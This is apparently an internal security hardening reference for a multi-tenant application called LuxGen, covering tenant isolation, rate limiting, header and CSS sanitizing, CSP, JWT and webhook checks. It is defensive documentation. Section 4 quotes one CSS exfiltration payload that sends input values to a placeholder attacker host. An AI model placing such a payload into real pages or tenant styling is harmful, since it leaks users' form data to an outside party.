# LuxGen — Security Hardening Reference

> **Audience:** Developers adding features, reviewers, security auditors.  
> **Last updated:** 2026-06-20 — post architectural audit.  
> **See also:** [ARCHITECTURE.md §15, §19](./ARCHITECTURE.md)

This document records the security invariants enforced in the codebase, why they exist, and how to comply with them when adding new code.

---

## 1. Tenant Isolation

### The rule

Every service method that accesses tenant-scoped data must:

1. Read `context.tenantId` — never call `Tenant.findOne({ subdomain })` inside a service (the context already carries a resolved `tenantId`).
2. Scope all DB queries with the tenant filter: `{ tenant: tenantId }`.
3. For cross-entity operations (reading members of a group, resources within a course, etc.), verify ownership first.

### The enforcement helper

```ts
// apps/api/src/services/groupService.ts
async function assertGroupBelongsToTenant(groupId: string, tenantId: string): Promise<void> {
  const group = await Group.findOne({ _id: groupId, tenant: tenantId }).lean();
  if (!group) throw new GraphQLError('Group not found', { extensions: { code: 'NOT_FOUND' } });
}
```

Copy this pattern for every new resource type. The function throws `NOT_FOUND` (not `FORBIDDEN`) to avoid leaking whether the resource exists in another tenant.

### Why this matters

Without the ownership check, an authenticated user from tenant A can send a `groupId` that belongs to tenant B, read its members, modify settings, or delete it. The GraphQL auth layer only verifies the user is authenticated — it does not verify the requested resource belongs to their tenant.

---

## 2. Rate Limiting

### Login rate limit

**File:** `apps/api/src/middleware/loginRateLimit.ts`

- Redis `INCR + PEXPIRE` per `{ip}:{email}` key with TTL = window duration.
- Falls back to an in-process `Map` with automatic eviction when Redis is unavailable.
- Applied in `userService.login()` — **not** as HTTP middleware — so the check runs regardless of whether the caller is REST or GraphQL.

**Do not bypass by calling `User.findOne` directly.** Always go through `userService.login()`.

### Tenant request rate limit

**File:** `apps/api/src/middleware/tenantHeaders.ts` (`tenantRateLimitMiddleware`)

- Redis `INCR + PEXPIRE` per `{tenantId}:{ip}` key.
- Enabled per-tenant via `tenant.settings.security.rateLimiting.enabled`.
- Returns accurate `X-Rate-Limit-Remaining` and rejects with HTTP 429 when the limit is exceeded.

### Scaling note

Both limiters use the shared `getRedisClient()` singleton from `apps/api/src/lib/redis.ts`. With Redis, limits are enforced consistently across all API instances. Without Redis, limits are per-process (acceptable for single-instance deployments; insufficient for horizontally-scaled production).

---

## 3. HTTP Header Injection

**File:** `apps/api/src/middleware/tenantHeaders.ts`

All tenant-provided string values are passed through `sanitizeHeader()` before being written to response headers:

```ts
function sanitizeHeader(value: string): string {
  return value.replace(/[\r\n]/g, '');
}
```

CR/LF characters in a header value allow attackers to inject additional headers or split HTTP responses. Since tenant `name`, `subdomain`, `plan`, and branding fields are stored as admin-editable strings, all of them go through this sanitizer.

**Rule:** Never call `res.set(key, tenantField)` without wrapping `tenantField` in `sanitizeHeader()`.

---

## 4. CSS Injection via Tenant Branding

**File:** `apps/api/src/middleware/tenantHeaders.ts`

Tenant branding includes `primaryColor`, `secondaryColor`, `accentColor`, `fontFamily`, and `customCSS`.

**What is safe to inject into `<style>` tags:**

| Field            | Sanitizer                                                      | Safe to inject                             |
| ---------------- | -------------------------------------------------------------- | ------------------------------------------ |
| `primaryColor`   | `sanitizeCssColor()` — allows only hex, rgb, hsl, named colors | Yes                                        |
| `secondaryColor` | same                                                           | Yes                                        |
| `accentColor`    | same                                                           | Yes                                        |
| `fontFamily`     | `sanitizeFontFamily()` — allows only `[a-zA-Z0-9\s,'"-]+`      | Yes                                        |
| `customCSS`      | **None**                                                       | **No — excluded from automatic injection** |

`customCSS` is stored in the tenant document but deliberately excluded from `tenantBrandingMiddleware`. CSS injection via `customCSS` can exfiltrate data (e.g., `input[value^=a] { background: url(attacker.com/a) }`). If `customCSS` must be supported in the future, it requires a dedicated, explicitly-escaped rendering path reviewed by security.

---

## 5. Content Security Policy

**File:** `apps/api/src/middleware/tenantHeaders.ts` (`tenantSecurityHeadersMiddleware`)

```
default-src 'self'
script-src 'self'                  ← no unsafe-inline, no unsafe-eval
style-src 'self' 'unsafe-inline'   ← inline styles permitted (CSS vars); inline scripts are not
img-src 'self' data: https:
font-src 'self' https:
connect-src 'self' wss:            ← wss: for graphql-ws subscriptions
object-src 'none'                  ← blocks Flash and plugins
base-uri 'self'                    ← prevents base-tag injection
```

`unsafe-eval` was intentionally removed. If any dependency requires `eval` (e.g. some older bundled libraries), it must be replaced or exempted via a nonce-based policy applied per request.

---

## 6. JWT Security

**Files:** `apps/api/src/utils/jwt.ts`, `apps/api/src/utils/tenantKeys.ts`

- Tokens are signed with **per-tenant keys** stored in `tenantKeyManager`. The `kid` (key ID) in the JWT header identifies which key to use.
- Tokens with no `kid` fall back to `JWT_SECRET` (global default). `JWT_SECRET` must be set — the startup check in `apps/api/src/index.ts` hard-fails if it is missing.
- `verifyToken` always verifies the signature — `decodeToken` (unverified decode) is only for extracting the `kid` to select the right key. Never use `decodeToken` for authorization decisions.

**Client-side session (`apps/web/lib/session.ts`):**

- `isTokenExpired()` returns `true` when the `exp` claim is missing. A token without an expiry is treated as expired, not as perpetually valid.
- Tenant mismatch (stored tenant ≠ host subdomain) triggers an immediate session clear and login redirect — not a silent drop.

---

## 7. Stripe Webhook Integrity

**File:** `apps/api/src/services/billingService.ts`

Three-layer defense for webhook handlers:

1. **Signature verification:** `stripe.webhooks.constructEvent(rawBody, signature, webhookSecret)` rejects unsigned or tampered payloads. The `/api/billing/webhook` route is mounted before `express.json()` so it receives the raw body.
2. **Idempotency guard:** Each processed Stripe event ID is stored in Redis (`luxgen:stripe:processed:{id}`) with a 7-day TTL using `SET NX`. If Redis delivers the same event twice (Stripe guarantees at-least-once), the duplicate is skipped.
3. **Dev mode is explicit opt-in:** `BILLING_DEV_MODE=true` is the only way to bypass Stripe. `NODE_ENV=development` no longer enables dev billing — a misconfigured production deploy cannot silently skip payment processing.

---

## 8. Startup Environment Validation

**File:** `apps/api/src/index.ts`

The server hard-fails before accepting any connections if these variables are missing:

```ts
const REQUIRED_ENV = ['JWT_SECRET', 'MONGODB_URI'];
```

This prevents the server from running in a broken-auth or disconnected-DB state, where it might accept requests but behave unpredictably (e.g., signing tokens with `undefined`, failing all DB queries silently).

**To add a new required variable:** append it to `REQUIRED_ENV`.

---

## 9. GraphQL Auth Policy

**File:** `apps/api/src/graphql/authPolicy.ts`

The `secureResolvers()` wrapper is applied to the merged resolver map. All Query and Mutation fields require authentication by default. Exceptions are declared explicitly:

```ts
export const PUBLIC_QUERIES = new Set([
  '_empty',
  'publishedListings',
  'publishedListing',
  'pricingPlans',
  'currentUser',
]);
export const PUBLIC_MUTATIONS = new Set([
  '_empty',
  'login',
  'register',
  'createListingDraft',
  'updateListingDraft',
  'createListingCheckoutSession',
]);
```

**Rule:** New resolvers are protected automatically. To make a new resolver public, add it to the appropriate set and document why it needs no auth. All public mutations should be reviewed — they execute without a verified user identity.

---

## 10. Pagination Input Validation

**File:** `apps/api/src/services/groupService.ts` (`buildCursorFilter`)

Cursor arguments are validated before use:

```ts
if (!Types.ObjectId.isValid(cursor)) {
  throw new GraphQLError('Invalid pagination cursor', { extensions: { code: 'BAD_USER_INPUT' } });
}
```

Without this guard, passing a non-ObjectId string to `new Types.ObjectId(cursor)` throws an unhandled exception that surfaces as a 500 with a stack trace. Apply this pattern to any resolver that constructs a MongoDB ObjectId from user input.

---

## 11. Atomic Operations

**File:** `apps/api/src/services/groupService.ts` (`deleteGroup`)

Operations that modify multiple collections must use MongoDB sessions and transactions to prevent partial writes:

```ts
const session = await mongoose.startSession();
await session.withTransaction(async () => {
  await Group.findOneAndDelete({ _id, tenant: tenantId }, { session });
  await GroupMember.deleteMany({ groupId: id }, { session });
});
await session.endSession();
```

Without a transaction, a crash between the two deletes leaves orphaned `GroupMember` documents referencing a non-existent group. Apply this pattern anywhere a logical operation spans more than one collection.

---

## 12. GroupMember Unique Index

**File:** `packages/db/src/group.ts`

```ts
GroupMemberSchema.index({ groupId: 1, userId: 1 }, { unique: true });
```

This is the last line of defense against concurrent duplicate membership writes. Application-level checks (checking before inserting) are subject to race conditions. The unique index guarantees uniqueness at the database level. Callers must handle `error.code === 11000` and translate it to a user-facing error.

---

## 13. Known Limitations & Open Items

| Item                                                            | Risk                                              | Status                                                                               |
| --------------------------------------------------------------- | ------------------------------------------------- | ------------------------------------------------------------------------------------ |
| JWT in `localStorage`                                           | XSS-accessible; stolen token allows impersonation | Acceptable short-term; migrate to `httpOnly` cookies for higher-security deployments |
| No per-resolver tenant scoping in billing/course/user resolvers | Cross-tenant read risk in those domains           | Requires the same `assertXBelongsToTenant` treatment as GroupService                 |
| `customCSS` stored but not injectable                           | Stored data has no secure render path             | Needs design decision before exposing in UI                                          |
| TypeScript `ignoreBuildErrors: true` in `next.config.js`        | Silent type regressions in web app                | Remove after fixing pre-existing type errors in `packages/ui`                        |
| Social login stubs                                              | Non-functional placeholders in login/register     | Not a security risk; functional gap only                                             |
